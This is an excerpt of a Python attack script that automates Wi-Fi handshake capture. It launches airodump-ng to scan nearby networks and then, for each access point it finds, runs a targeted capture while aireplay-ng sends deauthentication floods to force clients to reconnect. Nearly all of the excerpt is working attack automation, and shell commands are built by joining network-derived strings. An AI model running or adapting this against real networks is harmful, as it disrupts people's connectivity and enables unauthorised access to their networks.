...
def mon_networks(b,c):
	filename = "output_airmon"
	proc = subprocess.Popen(["x-terminal-emulator", "-e", "airodump-ng " + c + " -w " + filename + " --output-format csv"])
	wait_timeout(proc, b)
...
def mon_networks_for_handshake(mon, ap_mac, ap_name, ap_ch):
	...
	for i, row in enumerate(ap_mac):
		try:
			...
			name = name.replace(" ", "")
			command = "airodump-ng --bssid " + ap_mac[i] + " -c " + ap_ch[i] + " -w " + name + " " + mon
			proc_mon = subprocess.Popen(["x-terminal-emulator", "-e", command])
			
			#WAIT 2 SEC
			time.sleep(2)

			proc_deauth = subprocess.Popen(["x-terminal-emulator", "-e", "aireplay-ng --deauth 25 -a " + ap_mac[i] + " " + mon])
...
#CAPTURE NETWORK TRAFIC AROUND YOU
d = mon_networks(b,c)
...
j, k, l = mon_networks_for_handshake(c,g,h,i)
